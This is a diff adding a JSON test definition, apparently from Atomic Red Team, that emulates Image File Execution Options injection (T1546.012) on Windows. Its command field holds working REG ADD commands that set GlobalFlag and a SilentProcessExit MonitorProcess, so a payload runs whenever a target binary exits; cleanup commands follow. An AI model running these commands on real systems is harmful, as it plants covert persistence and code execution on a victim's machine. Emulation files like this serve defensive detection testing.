@@ -1,0 +1,37 @@
+{
+    "name": "IFEO Global Flags",
+    "description": "Leverage Global Flags Settings ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n",
+        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1546.012",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Image File Execution Options Injection",
+    "source": "ART",
+    "uuid": "46b1f278-c8ee-4aa5-acce-65e77b11f3c1",
+    "arguments": {
+        "target_binary": {
+            "description": "Binary To Attach To",
+            "type": "path",
+            "default": "notepad.exe"
+        },
+        "payload_binary": {
+            "description": "Binary To Execute",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
